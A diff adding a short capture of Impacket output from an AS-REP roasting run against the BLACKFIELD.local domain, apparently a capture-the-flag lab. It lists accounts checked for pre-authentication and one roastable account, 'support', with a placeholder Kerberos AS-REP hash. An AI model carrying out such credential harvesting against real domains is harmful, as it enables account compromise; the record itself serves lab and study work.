@@ -1,0 +1,6 @@
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[-] User guest@BLACKFIELD.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$support@BLACKFIELD.LOCAL:cccccccccccccccccccccccccccccccc$dddddddddddddddddddddddddddddddddddddddddddddddd
